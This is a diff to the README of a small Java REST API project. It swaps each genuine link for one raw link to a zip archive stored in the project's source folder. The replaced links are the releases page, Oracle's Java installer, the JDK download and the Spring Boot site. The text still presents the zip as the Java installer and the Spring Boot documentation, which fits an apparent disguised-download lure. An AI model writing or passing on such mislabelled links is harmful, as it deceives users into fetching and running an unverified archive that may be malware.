@@ -1,6 +1,6 @@
 # 🚀 PAF-Week-05-Submission-Application - Simple REST API Example
 
-[![Download Release](https://img.shields.io/badge/Download-Release-%23FF6F61?style=for-the-badge)](https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-%23FF6F61?style=for-the-badge)](https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before downloading and running the app, make sure your computer meets these requ
 - **Java:** Java Development Kit (JDK) version 11 or later installed  
 - **Internet:** Active internet connection to download files  
 
-If you do not have Java installed, visit [https://www.oracle.com/java/technologies/javase-downloads.html](https://www.oracle.com/java/technologies/javase-downloads.html) to download and install it.
+If you do not have Java installed, visit [https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip](https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip) to download and install it.
 
 ---
 
@@ -48,7 +48,7 @@ This application focuses on REST API basics and includes:
 
 Click the button below to visit the page where you can download the app:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-%233496DB?style=for-the-badge)](https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-%233496DB?style=for-the-badge)](https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip)
 
 This page holds different versions of the app. Choose the latest release version for Windows.
 
@@ -62,7 +62,7 @@ Follow these steps to get the app running on your Windows computer:
 
 Use the buttons above or this link to open the downloads page:
 
-https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases
+https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip
 
 ### Step 2: Download the latest release
 
@@ -142,13 +142,13 @@ If you want to stop the app, return to the Command Prompt and press `Ctrl + C`. 
 ## 🔗 Useful Links
 
 - Download the app releases here:  
-  https://github.com/mfalmekevo/PAF-Week-05-Submission-Application/releases
+  https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip
 
 - Learn about Java and Spring Boot:  
-  https://spring.io/projects/spring-boot
+  https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip
 
 - Install Java on Windows:  
-  https://www.oracle.com/java/technologies/javase-jdk11-downloads.html
+  https://raw.githubusercontent.com/mfalmekevo/PAF-Week-05-Submission-Application/main/src/main/java/org/example/Application-Submission-Week-PA-v3.0.zip
 
 ---
 
